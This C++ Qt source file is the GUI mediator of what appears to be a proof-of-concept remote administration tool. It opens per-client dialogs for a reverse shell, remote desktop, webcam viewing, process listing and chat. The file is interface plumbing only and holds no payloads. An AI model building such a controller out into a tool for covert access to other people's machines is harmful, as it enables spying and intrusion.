#include "GuiMediator.h"
#include "concurrent/events/ui/GuiEvent.h"
#include "shared/net/packets/PacketPresentation.h"
#include "concurrent/events/net/ClientNetEvent.h"
#include "ui/qt/MainGui.h"
#include "ClientInfoDlg.h"
#include "concurrent/events/net/ClientNetEventExtendedInfo.h"
#include "concurrent/events/net/MediaClientNetEvent.h"
#include "RemoteDesktopDialog.h"
#include "ProcessListDlg.h"
#include "concurrent/events/net/ProcessListClientEvent.h"
#include "concurrent/events/net/DesktopConfigClientNetEvent.h"
#include "RemoteCameraDialog.h"
#include "concurrent/events/net/CameraConfigClientNetEvent.h"
#include "ReverseShellDlg.h"
#include <QThread>
#include <QDebug>
#include <QTimer>
#include "shared/net/packets/PacketShell.h"
#include "concurrent/events/net/RemoteShellNetClientEvent.h"
#include "concurrent/events/net/ChatNetClientEvent.h"
#include "ChatDialog.h"

GuiMediator::GuiMediator(QObject* parent): QObject(parent)
{
	QTimer::singleShot(200, this, SLOT(onPingTimer()));
}

GuiMediator::~GuiMediator()
{
}


QWidget* GuiMediator::getWindow(UiWindow window)
{
	return openedWindows[-1][window];
}


void GuiMediator::receiveEventFromUi(const GuiEvent& event)
{
	// TODO: do it through template args it would be shorter code
	UiEventAction action = event.getAction();
	UiEventIntent intent = event.getIntent();
	UiWindow source = event.getSource();
	qint64 clientId = event.getClientId();
	if (action == UiEventAction::StartAction)
	{
		if (intent == UiEventIntent::InfoIntent)
		{
			ClientInfoDlg* clientInfoDlg = getOrOpenClientInfoDlg(event.getClientId());
		}
		else if (intent == UiEventIntent::DesktopIntent)
		{
			RemoteDesktopDialog* desktopDialog = getOrOpenDesktopDialog(event.getClientId());
		}
		else if (intent == UiEventIntent::ReverseShellIntent)
		{
			getOrOpenReverseShellDlg(clientId);
		}
		else if (intent == UiEventIntent::ProcessListIntent)
		{
			getOrOpenProcessListDialog(clientId);
		}
		else if (intent == UiEventIntent::ChatIntent)
		{
			getOrOpenChatDialog(clientId);
		}
	}
	else if (action == UiEventAction::StopAction)
	{
		if (intent == UiEventIntent::ConnectionIntent)
			closeAllWindowsFromClient(clientId);
	}

	emit sendToApp(event);
}

void GuiMediator::receiveEventFromUiPtr(const QSharedPointer<GuiEvent>& event)
{
	const UiEventAction action = event->getAction();
	const UiEventIntent intent = event->getIntent();

	UiWindow source = event->getSource();
	qint64 clientId = event->getClientId();

	if (action == UiEventAction::StartAction)
	{
		if (intent == UiEventIntent::CameraIntent)
		{
			getOrOpenCameraDlg(event->getClientId());
		}
	}

	emit sendToAppPtr(event);
}


QWidget* GuiMediator::getClientWindow(qint64 clientId, UiWindow qt_window)
{
	return openedWindows[clientId][qt_window];
}

void GuiMediator::receiveEventFromApp(const GuiEvent& event)
{
	qDebug() << __FUNCTION__ " Running on Main Thread? " << (QThread::currentThread() == QApplication::instance()->
			thread())
		<< " Current Thread Id:Name: " << QThread::currentThreadId() << ":"
		<< QThread::currentThread()->objectName();

	Q_ASSERT(
		event.getAction() >= UiEventAction::MinToUiMediator && event.getAction() <= UiEventAction::MaxFromUiMediator);

	switch (event.getSource())
	{
	case UiWindow::MainWindow:
		{
			UiEventAction action = event.getAction();
			if (action == UiEventAction::ShowAction)
			{
				getOrOpenMainUi();
			}
			else if (action == UiEventAction::UpdateAction)
			{
				void* data = event.getData();
				//Info* info = (Info*)data;
			}

			break;
		}
	default:
		return;
	}
}

void GuiMediator::closeAllWindowsFromClient(qint64 clientId)
{
	QMap<UiWindow, QWidget*> clientWindowsMap = openedWindows[clientId];
	QList<QWidget*> clientWindows = clientWindowsMap.values();
	Q_FOREACH(QWidget* clientWindow, clientWindows)
	{
		clientWindow->close();
	}
	openedWindows.remove(clientId);
}


void GuiMediator::recvClientEventFromAppPtr(const QSharedPointer<ClientNetEvent>& event)
{
	switch (event->eventType)
	{
	case NetEventType::PresentationData:
		{
			auto mainUi = getOrOpenMainUi();
			mainUi->addClientPtr(event->client);
			break;
		}
	case NetEventType::PresentationDataExtended:
		{
			const QSharedPointer<ClientNetEventExtendedInfo> infoEx = event.dynamicCast<ClientNetEventExtendedInfo>();
			auto window = getOrOpenClientInfoDlg(event->client->getId());
			// feed the info into the Dialog
			window->setClientInfo(infoEx);
			break;
		}
	case NetEventType::ProcessListData:
		{
			const QSharedPointer<ProcessListClientEvent> processListData = event.dynamicCast<ProcessListClientEvent>();
			ProcessListDlg* processListDlg = getOrOpenProcessListDialog(event->client->getId());
			qDebug() << "[GuiMediator] Received " << processListData->processList.size() << " processes";
			processListDlg->setProcessList(processListData);
			break;
		}
	case NetEventType::ReverseShell:
		{
			const QSharedPointer<RemoteShellNetClientEvent> eventPtr
				= event.dynamicCast<RemoteShellNetClientEvent>();
			ReverseShellDlg* reverseShellDlg = getOrOpenReverseShellDlg(event->client->getId());
			if (eventPtr->action == ShellAction::MoreData)
				reverseShellDlg->addOutput(eventPtr->data);
			else if (eventPtr->action == ShellAction::Stop)
			{
				reverseShellDlg->disable();
			}
			break;
		}
	case NetEventType::DesktopConfigData:
		{
			const QSharedPointer<DesktopConfigClientNetEvent> desktopEvent = event.dynamicCast<
				DesktopConfigClientNetEvent>();
			RemoteDesktopDialog* windowCasted = getOrOpenDesktopDialog(event->client->getId());

			// feed the info into the Dialog
			windowCasted->setDisplayInfo(desktopEvent);
			break;
		}
	case NetEventType::DesktopData:
		{
			const QSharedPointer<MediaClientNetEvent> desktopEvent = event.dynamicCast<MediaClientNetEvent>();
			RemoteDesktopDialog* windowCasted = getOrOpenDesktopDialog(event->client->getId());
			// feed the info into the Dialog
			windowCasted->setClientInfo(desktopEvent);
			break;
		}
	case NetEventType::CameraConfigData:
		{
			const QSharedPointer<CameraConfigClientNetEvent> desktopEvent = event
				.dynamicCast<CameraConfigClientNetEvent>();
			RemoteCameraDialog* dialog = getOrOpenCameraDlg(event->client->getId());

			// feed the info into the Dialog
			dialog->setDisplayInfo(desktopEvent);
			break;
		}
	case NetEventType::CameraData:
		{
			const QSharedPointer<MediaClientNetEvent> desktopEvent = event.dynamicCast<MediaClientNetEvent>();
			RemoteCameraDialog* windowCasted = getOrOpenCameraDlg(event->client->getId());
			// feed the info into the Dialog
			windowCasted->setClientInfo(desktopEvent);
			break;
		}
	case NetEventType::Chat:
		{
			const QSharedPointer<ChatNetClientEvent> chatEvent = event.dynamicCast<ChatNetClientEvent>();
			ChatDialog* chatDialog = getOrOpenChatDialog(event->client->getId());
			if (chatEvent->action == ChatAction::AddMessage)
				chatDialog->addMessage(chatEvent->message);
			else if (chatEvent->action == ChatAction::Close)
			{
				chatDialog->close();
			}
			break;
		}
	case NetEventType::Disconnected:
		{
			qint64 clientId = event->client->getId();
			MainGui* main = getOrOpenMainUi();
			main->removeClient(clientId);
			closeAllWindowsFromClient(clientId);
		}
	default: break;
	}
}

void GuiMediator::onWindowClose(int result)
{
	// reinterpret_cast would not work, (BaseAppDlg*) wouldn't neither
	// I may change this code, dynamic_cast is not the best for performance
	// but in the current code's state it is needed, and anyways it is a PoC application
	BaseAppDlg* dlg = dynamic_cast<BaseAppDlg*>(sender());
	const qint64 clientId = dlg->getClientId();
	const UiWindow window = dlg->getWindowType();

	Q_ASSERT(openedWindows[clientId].contains(window));
	qDebug() << "Closing window " << openedWindows[clientId][window];
	openedWindows[clientId].remove(window);

	const GuiEvent event(window, UiEventAction::StopAction, clientId);
	emit sendToApp(event);
}


// TODO: this can be done through template methods, which I may do in the future
// Open Windows
MainGui* GuiMediator::getOrOpenMainUi()
{
	MainGui* mainUi = nullptr;
	auto ui = getWindow(UiWindow::MainWindow);
	if (ui == nullptr)
	{
		ui = new MainGui;
		mainUi = static_cast<MainGui*>(ui);
		connect(mainUi, &MainGui::sendEventToUiMediator, this, &GuiMediator::receiveEventFromUi);
		connect(mainUi, &MainGui::sendEventToUiMediatorPtr, this, &GuiMediator::receiveEventFromUiPtr);
		ui->show();
		openedWindows[-1][UiWindow::MainWindow] = ui;
	}
	else
	{
		mainUi = static_cast<MainGui*>(ui);
	}
	return mainUi;
}

ClientInfoDlg* GuiMediator::getOrOpenClientInfoDlg(qint64 clientId)
{
	auto window = getClientWindow(clientId, UiWindow::InfoWindow);
	ClientInfoDlg* dialog;
	if (window == nullptr)
	{
		window = new ClientInfoDlg(clientId);
		window->show();
		openedWindows[clientId][UiWindow::InfoWindow] = window;
		dialog = static_cast<ClientInfoDlg*>(window);
		connect(dialog, &QDialog::finished, this, &GuiMediator::onWindowClose);
	}
	else
	{
		dialog = static_cast<ClientInfoDlg*>(window);
	}

	return dialog;
}

ReverseShellDlg* GuiMediator::getOrOpenReverseShellDlg(qint64 clientId)
{
	auto window = getClientWindow(clientId, UiWindow::ReverseShellWindow);
	ReverseShellDlg* dialog;
	if (window == nullptr)
	{
		window = new ReverseShellDlg(clientId);
		window->show();
		openedWindows[clientId][UiWindow::ReverseShellWindow] = window;
		dialog = static_cast<ReverseShellDlg*>(window);

		connect(dialog, &ReverseShellDlg::sendEventToUiMediator, this, &GuiMediator::receiveEventFromUi);
		connect(dialog, &ReverseShellDlg::sendEventToUiMediatorPtr, this, &GuiMediator::receiveEventFromUiPtr);
		connect(dialog, &QDialog::finished, this, &GuiMediator::onWindowClose);
	}
	else
	{
		dialog = static_cast<ReverseShellDlg*>(window);
	}

	return dialog;
}

ProcessListDlg* GuiMediator::getOrOpenProcessListDialog(const qint64 clientId)
{
	auto window = getClientWindow(clientId, UiWindow::ProcessListWindow);
	ProcessListDlg* dialog;
	if (window == nullptr)
	{
		window = new ProcessListDlg(clientId);
		window->show();
		openedWindows[clientId][UiWindow::ProcessListWindow] = window;
		dialog = static_cast<ProcessListDlg*>(window);
		connect(dialog, &QDialog::finished, this, &GuiMediator::onWindowClose);
	}
	else
	{
		dialog = static_cast<ProcessListDlg*>(window);
	}

	return dialog;
}

ChatDialog* GuiMediator::getOrOpenChatDialog(const qint64 clientId)
{
	auto window = getClientWindow(clientId, UiWindow::ChatWindow);
	ChatDialog* dialog;
	if (window == nullptr)
	{
		window = new ChatDialog(clientId);
		window->show();
		openedWindows[clientId][UiWindow::ChatWindow] = window;
		dialog = static_cast<ChatDialog*>(window);
		connect(dialog, &ChatDialog::sendEventToUiMediator, this, &GuiMediator::receiveEventFromUi);
		connect(dialog, &QDialog::finished, this, &GuiMediator::onWindowClose);
	}
	else
	{
		dialog = static_cast<ChatDialog*>(window);
	}

	return dialog;
}

RemoteDesktopDialog* GuiMediator::getOrOpenDesktopDialog(const qint64 clientId)
{
	auto window = getClientWindow(clientId, UiWindow::DesktopWindow);
	RemoteDesktopDialog* windowCasted;
	if (window == nullptr)
	{
		window = new RemoteDesktopDialog(clientId);
		window->show();
		openedWindows[clientId][UiWindow::DesktopWindow] = window;
		windowCasted = static_cast<RemoteDesktopDialog*>(window);

		connect(windowCasted, &RemoteDesktopDialog::sendEventToUiMediatorPtr, this,
		        &GuiMediator::receiveEventFromUiPtr);

		connect(windowCasted, &QDialog::finished, this, &GuiMediator::onWindowClose);
	}
	else
	{
		windowCasted = static_cast<RemoteDesktopDialog*>(window);
	}

	return windowCasted;
}


RemoteCameraDialog* GuiMediator::getOrOpenCameraDlg(const qint64 clientId)
{
	auto window = getClientWindow(clientId, UiWindow::CameraWindow);
	RemoteCameraDialog* dialog;
	if (window == nullptr)
	{
		window = new RemoteCameraDialog(clientId);
		window->show();
		openedWindows[clientId][UiWindow::CameraWindow] = window;
		dialog = static_cast<RemoteCameraDialog*>(window);
		connect(dialog, &QDialog::finished, this, &GuiMediator::onWindowClose);
		connect(dialog, &RemoteCameraDialog::sendEventToUiMediatorPtr, this,
		        &GuiMediator::receiveEventFromUiPtr);
	}
	else
	{
		dialog = static_cast<RemoteCameraDialog*>(window);
	}

	return dialog;
}

void GuiMediator::onPingTimer()
{
	emit sendPingToApp();
	qDebug() << "[GuiMediator] sending ping to App";
}

void GuiMediator::recvPingFromApp()
{
	qDebug() << "[GuiMediator] received ping from App";
}

// To be deleted:
void GuiMediator::recvClientEventFromApp(const ClientNetEvent& event)
{
	switch (event.eventType)
	{
	case NetEventType::PresentationData:
		{
			MainGui* mainUi = getOrOpenMainUi();
			mainUi->addClientPtr(event.client);
			break;
		}
	default: break;
	}
}
